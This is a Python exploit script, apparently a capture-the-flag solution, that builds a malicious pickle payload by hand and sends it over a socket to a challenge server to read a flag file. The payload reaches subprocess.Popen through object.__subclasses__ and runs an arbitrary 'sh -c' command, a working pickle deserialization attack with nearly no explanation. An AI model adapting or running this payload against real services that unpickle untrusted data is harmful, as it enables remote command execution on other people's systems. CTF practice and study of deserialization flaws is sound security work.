import pickle
import base64
import socket


def s(st):
    b = st.encode()
    return bytes([0x8C, len(b)]) + b


def build_payload(cmd: str) -> bytes:
    p = b"\x80\x04"
    p += s("builtins") + s("getattr") + b"\x93"
    p += s("builtins") + s("object") + b"\x93"
    p += s("__subclasses__") + b"\x86\x52"
    p += b"\x29\x52\x94"
    p += s("builtins") + s("getattr") + b"\x93"
    p += b"\x68\x00" + s("__getitem__") + b"\x86\x52"
    p += b"M\x1b\x01\x85\x52\x94"
    p += b"\x68\x01("
    p += b"\x5d(" + s("sh") + s("-c") + s(cmd) + b"e"
    p += b"J\xff\xff\xff\xff"
    p += b"N"
    p += b"N"
    p += b"J\xff\xff\xff\xff"
    p += b"t\x52\x94"
    p += s("builtins") + s("getattr") + b"\x93"
    p += b"\x68\x02" + s("communicate") + b"\x86\x52\x94"
    p += b"\x29\x52\x94"
    p += s("builtins") + s("getattr") + b"\x93"
    p += b"\x68\x04" + s("__getitem__") + b"\x86\x52"
    p += b"K\x00\x85\x52"
    p += b"."
    return base64.b64encode(p)


def send_payload(host: str, port: int, payload: bytes) -> str:
    with socket.create_connection((host, port)) as sock:
        data = b""
        while b">" not in data:
            data += sock.recv(4096)
        sock.sendall(payload + b"\n")
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        return response.decode(errors="replace")


def main():
    host = "tjc.tf"
    port = 31422

    payload = build_payload("cat /flag*")
    result = send_payload(host, port, payload)
    print(result)


if __name__ == "__main__":
    main()
